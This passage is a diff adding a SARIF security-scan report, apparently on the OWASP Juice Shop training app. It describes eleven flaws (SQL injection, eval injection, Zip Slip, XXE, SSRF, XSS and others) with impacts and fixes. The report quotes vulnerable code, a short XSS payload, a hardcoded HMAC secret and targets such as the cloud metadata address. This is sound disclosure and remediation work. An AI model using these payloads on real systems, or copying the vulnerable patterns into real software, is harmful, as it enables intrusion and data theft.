@@ -1,0 +1,1016 @@
+{
+  "version": "2.1.0",
+  "$schema": "https://json.schemastore.org/sarif-2.1.0.json",
+  "runs": [
+    {
+      "tool": {
+        "driver": {
+          "name": "Strix",
+          "informationUri": "https://strix.ai",
+          "rules": [
+            {
+              "id": "CWE-89",
+              "name": "SQL Injection in Login Endpoint Enables Authentication Bypass",
+              "shortDescription": {
+                "text": "SQL Injection in Login Endpoint Enables Authentication Bypass"
+              },
+              "fullDescription": {
+                "text": "A critical SQL injection vulnerability exists in the authentication endpoint of the application. The login handler constructs a raw SQL query by directly interpolating the user-supplied email address into the query string without parameterization or input sanitization.\n\nThe vulnerable code in the login route handler builds a SELECT query against the Users table by embedding `req.body.email` directly into the SQL template literal. Since the password is hashed before interpolation, it is not directly injectable; however, the email field provides a fully exploitable injection point.\n\nAn attacker can supply a crafted email value to manipulate the SQL query logic, enabling complete authentication bypass without valid credentials. This grants access to any account in the system, including administrative accounts."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "help": {
+                "text": "A critical SQL injection vulnerability exists in the authentication endpoint of the application. The login handler constructs a raw SQL query by directly interpolating the user-supplied email address into the query string without parameterization or input sanitization.\n\nThe vulnerable code in the login route handler builds a SELECT query against the Users table by embedding `req.body.email` directly into the SQL template literal. Since the password is hashed before interpolation, it is not directly injectable; however, the email field provides a fully exploitable injection point.\n\nAn attacker can supply a crafted email value to manipulate the SQL query logic, enabling complete authentication bypass without valid credentials. This grants access to any account in the system, including administrative accounts.\n\nSuccessful exploitation allows an attacker to:\n\n- Bypass authentication entirely and log in as any user, including the administrator account\n- Extract sensitive data from the Users table (emails, password hashes, roles, TOTP secrets)\n- Enumerate all user accounts and their associated metadata\n- Escalate privileges by authenticating as admin or accounting-role users\n- Potentially pivot to further system compromise through administrative functionality\n\nBusiness impact is severe: full account takeover across all user tiers, exposure of personally identifiable information, and loss of trust in the platform's authentication controls.\n\n1. Replace the raw SQL query with Sequelize's parameterized query using bind parameters:\n\n```typescript\nmodels.sequelize.query(\n  `SELECT * FROM Users WHERE email = :email AND password = :password AND deletedAt IS NULL`,\n  {\n    replacements: { email: req.body.email || '', password: security.hash(req.body.password || '') },\n    model: UserModel,\n    plain: true\n  }\n)\n```\n\n2. Alternatively, use Sequelize's ORM `findOne` method which automatically parameterizes inputs:\n\n```typescript\nUserModel.findOne({\n  where: {\n    email: req.body.email || '',\n    password: security.hash(req.body.password || ''),\n    deletedAt: null\n  }\n})\n```\n\n3. Add input validation to reject email values containing SQL metacharacters or exceeding expected length.\n\n4. Implement application-level rate limiting on the login endpoint to slow down automated injection attempts.\n\n5. Enable query logging in non-production environments to detect unexpected query patterns during testing."
+              },
+              "properties": {
+                "security-severity": "9.1",
+                "tags": [
+                  "security",
+                  "CWE-89"
+                ]
+              },
+              "helpUri": "https://cwe.mitre.org/data/definitions/89.html"
+            },
+            {
+              "id": "CWE-94",
+              "name": "Server-Side Code Injection via eval() in User Profile Username Processing",
+              "shortDescription": {
+                "text": "Server-Side Code Injection via eval() in User Profile Username Processing"
+              },
+              "fullDescription": {
+                "text": "A server-side code injection vulnerability exists in the user profile rendering endpoint (`GET /profile`). When a user's stored username matches the pattern `#{(...)}`, the application extracts the content between the delimiters and passes it directly to JavaScript's `eval()` function on the server side. This enables arbitrary server-side code execution by any authenticated user who can control their username value.\n\nThe vulnerable code path in `routes/userProfile.ts` (lines 55-62):\n```typescript\nif (username?.match(/#{(.*)}/) !== null && utils.isChallengeEnabled(challenges.usernameXssChallenge)) {\n  const code = username?.substring(2, username.length - 1)\n  username = eval(code)\n}\n```\n\nAdditionally, the resulting username value (whether from eval output or raw) is substituted directly into a Pug template string before compilation (`template.replace(/_username_/g, username)`), creating a secondary server-side template injection (SSTI) vector. The combination of eval-based code execution and template injection provides multiple exploitation paths for remote code execution."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "help": {
+                "text": "A server-side code injection vulnerability exists in the user profile rendering endpoint (`GET /profile`). When a user's stored username matches the pattern `#{(...)}`, the application extracts the content between the delimiters and passes it directly to JavaScript's `eval()` function on the server side. This enables arbitrary server-side code execution by any authenticated user who can control their username value.\n\nThe vulnerable code path in `routes/userProfile.ts` (lines 55-62):\n```typescript\nif (username?.match(/#{(.*)}/) !== null && utils.isChallengeEnabled(challenges.usernameXssChallenge)) {\n  const code = username?.substring(2, username.length - 1)\n  username = eval(code)\n}\n```\n\nAdditionally, the resulting username value (whether from eval output or raw) is substituted directly into a Pug template string before compilation (`template.replace(/_username_/g, username)`), creating a secondary server-side template injection (SSTI) vector. The combination of eval-based code execution and template injection provides multiple exploitation paths for remote code execution.\n\nSuccessful exploitation enables an attacker to:\n\n- Execute arbitrary JavaScript code on the server with the privileges of the Node.js process\n- Read sensitive files from the server filesystem (e.g., environment variables, encryption keys, database files)\n- Establish reverse shells or persistent backdoors on the application server\n- Access and exfiltrate all data from the application database\n- Pivot to internal network resources accessible from the server\n- Modify application behavior or inject malicious content for all users\n- Achieve complete server compromise\n\nThe attack requires only that an authenticated user can modify their username field (via the profile update endpoint) and subsequently visit the profile page. This is a critical severity issue as it provides full remote code execution with no additional privileges beyond a standard user account.\n\n1. Remove the `eval()` call entirely. There is no secure way to evaluate user-controlled strings as code:\n\n   ```typescript\n   // Remove the entire eval block (lines 55-68)\n   // Always escape the username for safe template insertion\n   username = '\\\\' + username\n   ```\n\n2. If dynamic username rendering is required, use a strict allowlist of safe characters and HTML-encode the output:\n\n   ```typescript\n   const entities = new Entities()\n   username = entities.encode(user.username || '')\n   ```\n\n3. Replace the raw string substitution into the Pug template with proper Pug variable passing to leverage Pug's built-in escaping:\n\n   ```typescript\n   const fn = pug.compile(template)\n   res.send(fn({ username: entities.encode(username), ...otherVars }))\n   ```\n\n4. Apply Content-Security-Policy headers that restrict script execution sources and prevent inline JavaScript.\n\n5. Implement input validation on the username field at the model level to reject special characters and template syntax patterns."
+              },
+              "properties": {
+                "security-severity": "9.9",
+                "tags": [
+                  "security",
+                  "CWE-94"
+                ]
+              },
+              "helpUri": "https://cwe.mitre.org/data/definitions/94.html"
+            },
+            {
+              "id": "CWE-22",
+              "name": "Arbitrary File Write via Zip Slip in File Upload Endpoint",
+              "shortDescription": {
+                "text": "Arbitrary File Write via Zip Slip in File Upload Endpoint"
+              },
+              "fullDescription": {
+                "text": "A path traversal vulnerability (Zip Slip) exists in the file upload endpoint at POST /file-upload. When a ZIP archive is uploaded, the application extracts its entries and writes them to the `uploads/complaints/` directory. However, the path validation logic is insufficient to prevent directory traversal sequences within ZIP entry names.\n\nThe application resolves the full path of each ZIP entry and checks whether it contains the application's root directory path. Since traversal paths like `../../ftp/legal.md` resolve to locations that still fall within the application's root directory tree, the check passes and the file is written to an attacker-controlled location outside the intended `uploads/complaints/` directory."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "help": {
+                "text": "A path traversal vulnerability (Zip Slip) exists in the file upload endpoint at POST /file-upload. When a ZIP archive is uploaded, the application extracts its entries and writes them to the `uploads/complaints/` directory. However, the path validation logic is insufficient to prevent directory traversal sequences within ZIP entry names.\n\nThe application resolves the full path of each ZIP entry and checks whether it contains the application's root directory path. Since traversal paths like `../../ftp/legal.md` resolve to locations that still fall within the application's root directory tree, the check passes and the file is written to an attacker-controlled location outside the intended `uploads/complaints/` directory.\n\nSuccessful exploitation allows an attacker to:\n\n- Write arbitrary files to any location within the application's root directory tree, including overwriting existing application files.\n- Achieve remote code execution by overwriting server-side templates, configuration files, or JavaScript modules that are subsequently loaded by the application.\n- Deface the application by overwriting static assets or frontend files.\n- Modify legal documents, terms of service, or privacy policy files served from the /ftp directory.\n- Potentially escalate to full server compromise if writable paths include startup scripts or cron-accessible locations.\n\nBusiness impact includes service integrity compromise, unauthorized content modification, and potential for persistent backdoor installation.\n\n1. Replace the flawed path inclusion check with a proper prefix validation that ensures the resolved path starts with the intended destination directory:\n\n```javascript\nconst destDir = path.resolve('uploads/complaints/')\nconst absolutePath = path.resolve('uploads/complaints/' + fileName)\nif (!absolutePath.startsWith(destDir + path.sep)) {\n  entry.autodrain()\n  return\n}\n```\n\n2. Reject ZIP entries that contain path traversal sequences (`../`) or absolute paths before resolution:\n\n```javascript\nif (fileName.includes('..') || path.isAbsolute(fileName)) {\n  entry.autodrain()\n  return\n}\n```\n\n3. Sanitize the filename by extracting only the base name if subdirectories within the upload folder are not required:\n\n```javascript\nconst safeName = path.basename(fileName)\n```\n\n4. Consider requiring authentication for file upload operations to reduce the attack surface.\n\n5. Apply filesystem permissions to limit the application's write access to only necessary directories."
+              },
+              "properties": {
+                "security-severity": "9.1",
+                "tags": [
+                  "security",
+                  "CWE-22"
+                ]
+              },
+              "helpUri": "https://cwe.mitre.org/data/definitions/22.html"
+            },
+            {
+              "id": "CWE-798",
+              "name": "Hardcoded Cryptographic Keys Enable JWT Forgery and Security Answer Disclosure",
+              "shortDescription": {
+                "text": "Hardcoded Cryptographic Keys Enable JWT Forgery and Security Answer Disclosure"
+              },
+              "fullDescription": {
+                "text": "The application embeds cryptographic key material directly in source code that is publicly available. The RSA private key used for JWT token signing is hardcoded as a string literal in `lib/insecurity.ts` (line 23), and the corresponding public key is shipped in `encryptionkeys/jwt.pub`. Additionally, the HMAC secret used to protect security question answers is hardcoded as `'pa4qacea4VK9t9nGv7yZtwmj'` on line 44. Since the repository is open source, any attacker with access to the codebase can forge arbitrary JWT tokens and reverse security answer hashes."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "help": {
+                "text": "The application embeds cryptographic key material directly in source code that is publicly available. The RSA private key used for JWT token signing is hardcoded as a string literal in `lib/insecurity.ts` (line 23), and the corresponding public key is shipped in `encryptionkeys/jwt.pub`. Additionally, the HMAC secret used to protect security question answers is hardcoded as `'pa4qacea4VK9t9nGv7yZtwmj'` on line 44. Since the repository is open source, any attacker with access to the codebase can forge arbitrary JWT tokens and reverse security answer hashes.\n\nAn attacker who obtains the hardcoded private key (from the public repository) can:\n\n- Forge JWT tokens for any user, including administrators, achieving complete authentication bypass and privilege escalation without credentials\n- Maintain persistent access by minting long-lived tokens that bypass all authentication controls\n- Impersonate any user for data access, order manipulation, or administrative actions\n\nWith the hardcoded HMAC secret, an attacker can:\n- Compute valid HMAC hashes for arbitrary security answer guesses, effectively brute-forcing security answers offline\n- Bypass the password reset mechanism for any account by testing candidate answers locally\n\nTogether, these constitute a complete authentication system compromise.\n\n1. Remove all hardcoded cryptographic keys from source code immediately. Generate new RSA key pairs and HMAC secrets that are never committed to version control.\n\n2. Load the JWT private key from an environment variable or a secrets management service (e.g., AWS Secrets Manager, HashiCorp Vault, Azure Key Vault) at application startup.\n\n3. Rotate the compromised keys: since the current private key is publicly known, all existing JWTs must be considered compromised. Force re-authentication for all users after deploying new keys.\n\n4. Replace the hardcoded HMAC secret with a per-deployment secret loaded from environment configuration. Consider adding a per-user component (e.g., user ID) to the HMAC input to prevent cross-user attacks even with secret knowledge.\n\n5. Add pre-commit hooks and CI/CD checks (e.g., gitleaks, trufflehog) to prevent future key material from being committed to the repository.\n\n6. Add the `encryptionkeys/` directory to `.gitignore` and document the key provisioning process for deployment."
+              },
+              "properties": {
+                "security-severity": "9.1",
+                "tags": [
+                  "security",
+                  "CWE-798"
+                ]
+              },
+              "helpUri": "https://cwe.mitre.org/data/definitions/798.html"
+            },
+            {
+              "id": "CWE-620",
+              "name": "Authentication Bypass via Missing Current Password Validation in Password Change",
+              "shortDescription": {
+                "text": "Authentication Bypass via Missing Current Password Validation in Password Change"
+              },
+              "fullDescription": {
+                "text": "The password change endpoint permits changing a user's password without verifying the current password. The conditional check on line 39 of the changePassword handler uses a short-circuit evaluation pattern that skips verification entirely when the `current` query parameter is omitted or left empty. This effectively allows any authenticated session—including one obtained via cross-site request forgery—to reset a user's password to an attacker-controlled value without knowledge of the existing credential."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "help": {
+                "text": "The password change endpoint permits changing a user's password without verifying the current password. The conditional check on line 39 of the changePassword handler uses a short-circuit evaluation pattern that skips verification entirely when the `current` query parameter is omitted or left empty. This effectively allows any authenticated session—including one obtained via cross-site request forgery—to reset a user's password to an attacker-controlled value without knowledge of the existing credential.\n\nAn attacker who obtains even momentary access to a user's session token—or who can deliver a CSRF payload to a logged-in victim—can change the victim's password without knowledge of the original password. This leads to complete account takeover: the attacker locks the legitimate user out and gains persistent control of the account, including any associated data, orders, and administrative privileges.\n\n1. Make the current password parameter mandatory. Reject the request with HTTP 401 if `current` is not provided or is empty.\n\n2. Always validate the current password hash against the stored hash before permitting the update. Remove the short-circuit pattern.\n\n3. Change the endpoint from GET to POST to prevent trivial CSRF via URL parameters and to avoid logging credentials in server access logs and browser history.\n\n4. Implement CSRF protection (e.g., anti-CSRF tokens or SameSite cookie enforcement) as defense-in-depth.\n\n5. Consider adding rate limiting on password change attempts to mitigate brute-force scenarios."
+              },
+              "properties": {
+                "security-severity": "8.1",
+                "tags": [
+                  "security",
+                  "CWE-620"
+                ]
+              },
+              "helpUri": "https://cwe.mitre.org/data/definitions/620.html"
+            },
+            {
+              "id": "CWE-918",
+              "name": "Server-Side Request Forgery via Profile Image URL Upload",
+              "shortDescription": {
+                "text": "Server-Side Request Forgery via Profile Image URL Upload"
+              },
+              "fullDescription": {
+                "text": "A server-side request forgery (SSRF) vulnerability exists in the profile image URL upload functionality. The application accepts a user-supplied URL via the `imageUrl` parameter in a POST request to `/profile/image/url` and performs a server-side HTTP fetch without validating the destination address.\n\nNo allowlist, denylist, or network-level restriction prevents the server from making requests to internal hosts, loopback addresses, link-local metadata endpoints, or arbitrary external services. Additionally, when the fetch operation fails (e.g., non-HTTP protocol, timeout), the catch handler stores the raw user-supplied URL directly in the database as the user's profile image without any sanitization."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "help": {
+                "text": "A server-side request forgery (SSRF) vulnerability exists in the profile image URL upload functionality. The application accepts a user-supplied URL via the `imageUrl` parameter in a POST request to `/profile/image/url` and performs a server-side HTTP fetch without validating the destination address.\n\nNo allowlist, denylist, or network-level restriction prevents the server from making requests to internal hosts, loopback addresses, link-local metadata endpoints, or arbitrary external services. Additionally, when the fetch operation fails (e.g., non-HTTP protocol, timeout), the catch handler stores the raw user-supplied URL directly in the database as the user's profile image without any sanitization.\n\nSuccessful exploitation enables an attacker to:\n\n- Reach internal-only services running on localhost or the internal network (e.g., administration panels, databases, message brokers)\n- Access cloud instance metadata endpoints (e.g., http://169.254.169.254/latest/meta-data/) to retrieve temporary credentials, instance identity documents, and configuration data\n- Enumerate internal network topology via timing and response-status side channels\n- Exfiltrate data from internal services by writing fetched response bodies to the filesystem as image files that can later be retrieved by the attacker\n- Store arbitrary URLs in the database (profileImage field) that could be used for phishing when rendered in the UI\n\nBusiness impact includes potential compromise of cloud infrastructure credentials, unauthorized access to internal services, and lateral movement within the hosting environment.\n\nImplement layered SSRF defenses:\n\n1. Enforce a strict URL scheme allowlist. Only permit `https://` (and `http://` if absolutely required for external image hosting). Reject all other schemes.\n\n2. Implement destination validation after DNS resolution. Resolve the hostname and verify the resulting IP address does not fall within private (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16), loopback (127.0.0.0/8, ::1), or link-local (169.254.0.0/16, fe80::/10) ranges. Apply this check on every redirect hop.\n\n3. Maintain a domain allowlist for permitted image sources. Only fetch images from a predefined set of trusted image hosting domains.\n\n4. Remove the fallback that stores the raw URL in the database. If the fetch fails, return an error to the user instead of persisting the untrusted URL.\n\n5. Apply network-level egress controls as defense in depth. Configure outbound firewall rules to prevent the application from reaching sensitive internal services or metadata endpoints.\n\n6. Set appropriate timeouts and response size limits on outbound fetch operations to prevent denial-of-service via slow or large responses."
+              },
+              "properties": {
+                "security-severity": "8.5",
+                "tags": [
+                  "security",
+                  "CWE-918"
+                ]
+              },
+              "helpUri": "https://cwe.mitre.org/data/definitions/918.html"
+            },
+            {
+              "id": "CWE-611",
+              "name": "XML External Entity (XXE) Injection via File Upload Endpoint",
+              "shortDescription": {
+                "text": "XML External Entity (XXE) Injection via File Upload Endpoint"
+              },
+              "fullDescription": {
+                "text": "An XML External Entity (XXE) injection vulnerability exists in the file upload endpoint at POST /file-upload. The application accepts XML file uploads and parses them using the libxmljs2 library with external entity resolution explicitly enabled via the `noent: true` parser option.\n\nWhen a user uploads a file with a `.xml` extension, the server-side XML parser resolves external entities defined in the document's DOCTYPE declaration. The resolved content is then reflected in the HTTP error response, creating a direct channel for data exfiltration. This enables an attacker to read arbitrary files from the server's filesystem, perform server-side request forgery (SSRF) against internal services, and cause denial-of-service conditions through recursive entity expansion."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "help": {
+                "text": "An XML External Entity (XXE) injection vulnerability exists in the file upload endpoint at POST /file-upload. The application accepts XML file uploads and parses them using the libxmljs2 library with external entity resolution explicitly enabled via the `noent: true` parser option.\n\nWhen a user uploads a file with a `.xml` extension, the server-side XML parser resolves external entities defined in the document's DOCTYPE declaration. The resolved content is then reflected in the HTTP error response, creating a direct channel for data exfiltration. This enables an attacker to read arbitrary files from the server's filesystem, perform server-side request forgery (SSRF) against internal services, and cause denial-of-service conditions through recursive entity expansion.\n\nSuccessful exploitation allows an attacker to:\n\n- Read sensitive server-side files including application configuration, environment variables, encryption keys, source code, and system files such as /etc/passwd or /etc/shadow (if readable by the application process).\n- Perform SSRF by directing the XML parser to fetch resources from internal network hosts and cloud metadata endpoints (e.g., http://169.254.169.254/).\n- Cause denial of service through entity expansion attacks (billion laughs), triggering a 2-second script timeout and returning HTTP 503 errors.\n- Exfiltrate up to 400 characters of file content per request through the error response, with repeated requests enabling extraction of larger files.\n\nBusiness impact includes potential exposure of database credentials, JWT signing keys, customer data, and internal service topology.\n\n1. Disable external entity resolution in the XML parser configuration. Replace `noent: true` with `noent: false` (or remove it entirely since false is the default):\n\n```javascript\nconst xmlDoc = vm.runInContext(\n  'libxml.parseXml(data, { noblanks: true, noent: false, nocdata: true })',\n  sandbox,\n  { timeout: 2000 }\n)\n```\n\n2. Additionally, disable DTD loading to prevent XXE via parameter entities:\n\n```javascript\nconst xmlDoc = vm.runInContext(\n  'libxml.parseXml(data, { noblanks: true, noent: false, nocdata: true, dtdload: false, dtdvalid: false })',\n  sandbox,\n  { timeout: 2000 }\n)\n```\n\n3. Do not reflect parsed XML content in error responses. Return a generic error message that does not include document content.\n\n4. Implement file type validation and consider whether XML upload functionality is still required. If deprecated, remove the XML parsing logic entirely.\n\n5. Apply defense-in-depth by running the application with minimal filesystem permissions and restricting outbound network access from the application runtime."
+              },
+              "properties": {
+                "security-severity": "8.2",
+                "tags": [
+                  "security",
+                  "CWE-611"
+                ]
+              },
+              "helpUri": "https://cwe.mitre.org/data/definitions/611.html"
+            },
+            {
+              "id": "CWE-79",
+              "name": "Reflected Cross-Site Scripting (XSS) via Order Tracking Endpoint",
+              "shortDescription": {
+                "text": "Reflected Cross-Site Scripting (XSS) via Order Tracking Endpoint"
+              },
+              "fullDescription": {
+                "text": "A reflected cross-site scripting vulnerability exists in the order tracking endpoint at `/rest/track-order/:id`. When the `reflectedXssChallenge` configuration is enabled (default in standard deployment), the `id` route parameter undergoes only length truncation (60 characters) rather than proper sanitization. The unsanitized identifier is then reflected directly in the JSON response body.\n\nThe vulnerable code path applies `utils.trunc(req.params.id, 60)` instead of the safer character-whitelist regex replacement. The truncated but otherwise unfiltered value is subsequently embedded in the response JSON when no matching order is found: `result.data[0] = { orderId: id }`. Because the payload `<iframe src=\"javascript:alert(`xss`)\">` fits within the 60-character limit, an attacker can craft a URL that, when visited by a victim, executes arbitrary JavaScript in the victim's browser context."
+              },
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "help": {
+                "text": "A reflected cross-site scripting vulnerability exists in the order tracking endpoint at `/rest/track-order/:id`. When the `reflectedXssChallenge` configuration is enabled (default in standard deployment), the `id` route parameter undergoes only length truncation (60 characters) rather than proper sanitization. The unsanitized identifier is then reflected directly in the JSON response body.\n\nThe vulnerable code path applies `utils.trunc(req.params.id, 60)` instead of the safer character-whitelist regex replacement. The truncated but otherwise unfiltered value is subsequently embedded in the response JSON when no matching order is found: `result.data[0] = { orderId: id }`. Because the payload `<iframe src=\"javascript:alert(`xss`)\">` fits within the 60-character limit, an attacker can craft a URL that, when visited by a victim, executes arbitrary JavaScript in the victim's browser context.\n\nSuccessful exploitation enables an attacker to:\n\n- Execute arbitrary JavaScript in the context of the victim's authenticated session\n- Steal session tokens, cookies, and sensitive user data\n- Perform actions on behalf of the authenticated user (order placement, profile modification, password change)\n- Redirect the user to phishing pages or inject credential-harvesting overlays\n- Chain with other vulnerabilities for full account takeover\n\nThe attack requires only that a victim clicks a crafted link, making it highly exploitable in phishing or social engineering campaigns.\n\n1. Replace the length-only truncation with strict input validation that removes or encodes all HTML-special characters regardless of challenge configuration:\n\n   ```typescript\n   const id = String(req.params.id).replace(/[^\\w-]+/g, '')\n   ```\n\n2. Apply consistent output encoding when reflecting any user input in responses, even in JSON values that will be rendered by the frontend.\n\n3. Implement Content-Security-Policy headers that prevent inline script execution on all endpoints returning user-controlled data.\n\n4. On the client side, ensure Angular templates use safe interpolation (`{{ }}` with automatic escaping) rather than `innerHTML` bindings when rendering order tracking results."
+              },
+              "properties": {
+                "security-severity": "6.1",
+                "tags": [
+                  "security",
+                  "CWE-79"
+                ]
+              },
+              "helpUri": "https://cwe.mitre.org/data/definitions/79.html"
+            },
+            {
+              "id": "CWE-639",
+              "name": "Insecure Direct Object Reference (IDOR) in Shopping Basket Access",
+              "shortDescription": {
+                "text": "Insecure Direct Object Reference (IDOR) in Shopping Basket Access"
+              },
+              "fullDescription": {
+                "text": "The basket retrieval endpoint exposes an Insecure Direct Object Reference vulnerability. The `retrieveBasket` function in `routes/basket.ts` accepts a basket ID from the URL path parameter and returns the full basket contents—including product details and quantities—without verifying that the requesting user is the owner of that basket. Any authenticated user can access any other user's basket by simply enumerating or guessing basket IDs."
+              },
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "help": {
+                "text": "The basket retrieval endpoint exposes an Insecure Direct Object Reference vulnerability. The `retrieveBasket` function in `routes/basket.ts` accepts a basket ID from the URL path parameter and returns the full basket contents—including product details and quantities—without verifying that the requesting user is the owner of that basket. Any authenticated user can access any other user's basket by simply enumerating or guessing basket IDs.\n\nAn attacker with a valid session can enumerate basket IDs (sequential integers starting at 1) and retrieve the shopping cart contents of all other users. This exposes:\n\n- Product selections and quantities (potential competitive intelligence or personal preference data)\n- User purchasing behavior and intent\n- Potential for chaining with basket manipulation to tamper with other users' orders\n\nIn a real-world e-commerce context, this constitutes a privacy violation and a regulatory compliance failure (GDPR, CCPA) as user behavioral data is disclosed without consent.\n\n1. Add an authorization check in the `retrieveBasket` handler that compares the requested basket ID against the authenticated user's own basket ID. Return HTTP 403 if they do not match.\n\n2. Use the existing `security.authenticatedUsers.from(req)` helper to obtain the authenticated user's basket ID (`user.bid`) and compare it to the requested `req.params.id`.\n\n3. Consider removing the basket ID from the URL path entirely and instead always serving the authenticated user's own basket, eliminating the IDOR vector by design.\n\n4. Apply the same ownership check pattern to all basket-related endpoints (basket items, updates, deletions)."
+              },
+              "properties": {
+                "security-severity": "6.5",
+                "tags": [
+                  "security",
+                  "CWE-639"
+                ]
+              },
+              "helpUri": "https://cwe.mitre.org/data/definitions/639.html"
+            },
+            {
+              "id": "CWE-601",
+              "name": "Open Redirect via Allowlist Bypass in URL Redirect Endpoint",
+              "shortDescription": {
+                "text": "Open Redirect via Allowlist Bypass in URL Redirect Endpoint"
+              },
+              "fullDescription": {
+                "text": "An open redirect vulnerability exists in the `/redirect` endpoint due to a flawed URL allowlist validation mechanism. The `isRedirectAllowed` function in `lib/insecurity.ts` uses `String.prototype.includes()` to check whether the user-supplied target URL contains any of the allowlisted URLs as a substring. This logic is fundamentally broken because it permits any URL that merely contains an allowed URL anywhere within it — including as a query parameter value, fragment, path component, or subdomain prefix.\n\nAn attacker can craft a URL to an attacker-controlled domain that embeds an allowlisted URL as a substring, thereby bypassing the allowlist entirely and causing the server to issue a 302 redirect to the malicious destination."
+              },
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "help": {
+                "text": "An open redirect vulnerability exists in the `/redirect` endpoint due to a flawed URL allowlist validation mechanism. The `isRedirectAllowed` function in `lib/insecurity.ts` uses `String.prototype.includes()` to check whether the user-supplied target URL contains any of the allowlisted URLs as a substring. This logic is fundamentally broken because it permits any URL that merely contains an allowed URL anywhere within it — including as a query parameter value, fragment, path component, or subdomain prefix.\n\nAn attacker can craft a URL to an attacker-controlled domain that embeds an allowlisted URL as a substring, thereby bypassing the allowlist entirely and causing the server to issue a 302 redirect to the malicious destination.\n\nSuccessful exploitation enables an attacker to:\n\n- Construct phishing links that appear to originate from the trusted application domain, tricking users into visiting malicious sites after clicking what appears to be a legitimate link\n- Intercept OAuth authorization codes or tokens if the redirect endpoint is used in any authentication flow by redirecting to an attacker-controlled callback\n- Bypass content security policies or same-origin trust relationships where URL origin is used as a trust signal\n- Steal credentials by redirecting users to a cloned login page on an attacker-controlled domain\n\nThe vulnerability significantly increases the effectiveness of social engineering attacks because the initial link points to the legitimate application domain, which victims are more likely to trust.\n\nReplace the substring-based check with a strict URL origin comparison:\n\n1. Parse the user-supplied URL using the WHATWG URL constructor to canonicalize it and extract the origin (scheme + host + port).\n\n2. Compare the parsed origin against the set of allowed URL origins. Only permit the redirect if the origin matches exactly.\n\n3. Alternatively, verify that the user-supplied URL starts with one of the allowed URLs using strict prefix comparison (as the existing `isUnintendedRedirect` function already demonstrates with `startsWith`).\n\n4. Reject URLs that cannot be parsed or that use unexpected schemes (e.g., `javascript:`, `data:`, `vbscript:`).\n\n5. Consider removing the open redirector entirely if it is not a business requirement, or restrict it to relative same-origin paths only."
+              },
+              "properties": {
+                "security-severity": "6.1",
+                "tags": [
+                  "security",
+                  "CWE-601"
+                ]
+              },
+              "helpUri": "https://cwe.mitre.org/data/definitions/601.html"
+            },
+            {
+              "id": "CWE-916",
+              "name": "Insecure Password Storage Using Unsalted MD5 Hashing",
+              "shortDescription": {
+                "text": "Insecure Password Storage Using Unsalted MD5 Hashing"
+              },
+              "fullDescription": {
+                "text": "The application stores user passwords using the MD5 hashing algorithm without any salt. The `hash` function in `lib/insecurity.ts` (line 43) applies a single round of MD5 to plaintext passwords before database storage. MD5 is a cryptographically broken hash function with known collision attacks, and the absence of a per-user salt means identical passwords produce identical hashes, enabling rainbow table and precomputed dictionary attacks against the entire user base simultaneously."
+              },
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "help": {
+                "text": "The application stores user passwords using the MD5 hashing algorithm without any salt. The `hash` function in `lib/insecurity.ts` (line 43) applies a single round of MD5 to plaintext passwords before database storage. MD5 is a cryptographically broken hash function with known collision attacks, and the absence of a per-user salt means identical passwords produce identical hashes, enabling rainbow table and precomputed dictionary attacks against the entire user base simultaneously.\n\nAn attacker who gains read access to the user database (via SQL injection, backup exposure, or insider access) can reverse the majority of user password hashes in seconds using publicly available rainbow tables or GPU-accelerated cracking tools. MD5 hashes can be brute-forced at rates exceeding 50 billion hashes per second on modern hardware. Since no salt is applied, all users sharing the same password will have identical hashes, enabling instant bulk credential recovery.\n\nThis leads to:\n- Mass account compromise across the application\n- Credential reuse attacks against users' accounts on other platforms\n- Complete loss of password confidentiality even with database-only read access\n- Regulatory non-compliance (NIST SP 800-63B, OWASP ASVS, PCI DSS)\n\n1. Replace MD5 with a modern password-hashing algorithm such as bcrypt, scrypt, or Argon2id. These algorithms incorporate per-hash salts, configurable work factors, and memory-hard operations that resist GPU/ASIC acceleration.\n\n2. Implement the migration as follows:\n   - Add bcrypt (or argon2) as a dependency\n   - Create a new hash function using bcrypt with a minimum cost factor of 12\n   - On user login with a valid MD5-stored password, transparently rehash the password with bcrypt and update the database record\n   - Set a deadline after which MD5-only hashes are invalidated and users must reset passwords\n\n3. Ensure all password comparison uses constant-time comparison to prevent timing side-channels.\n\n4. Audit all other uses of the MD5 `hash()` function to confirm none are used for security-sensitive purposes beyond password storage.\n\n5. Update password policies to enforce minimum complexity requirements alongside the stronger hashing."
+              },
+              "properties": {
+                "security-severity": "6.5",
+                "tags": [
+                  "security",
+                  "CWE-916"
+                ]
+              },
+              "helpUri": "https://cwe.mitre.org/data/definitions/916.html"
+            }
+          ]
+        }
+      },
+      "results": [
+        {
+          "ruleId": "CWE-89",
+          "level": "error",
+          "message": {
+            "text": "SQL Injection in Login Endpoint Enables Authentication Bypass"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "routes/login.ts"
+                },
+                "region": {
+                  "startLine": 34,
+                  "endLine": 34,
+                  "snippet": {
+                    "text": "models.sequelize.query(`SELECT * FROM Users WHERE email = '${req.body.email || ''}' AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`, { model: UserModel, plain: true }) // vuln-code-snippet vuln-line loginAdminChallenge loginBenderChallenge loginJimChallenge"
+                  }
+                }
+              },
+              "message": {
+                "text": "Unsanitized user input (req.body.email) interpolated directly into raw SQL query"
+              }
+            }
+          ],
+          "properties": {
+            "security-severity": "9.1",
+            "strix": {
+              "id": "vuln-0001",
+              "severity": "critical",
+              "cvss": 9.1,
+              "timestamp": "2026-05-09 09:45:27 UTC",
+              "target": "https://github.com/juice-shop/juice-shop",
+              "endpoint": "/rest/user/login",
+              "method": "POST",
+              "cwe": "CWE-89",
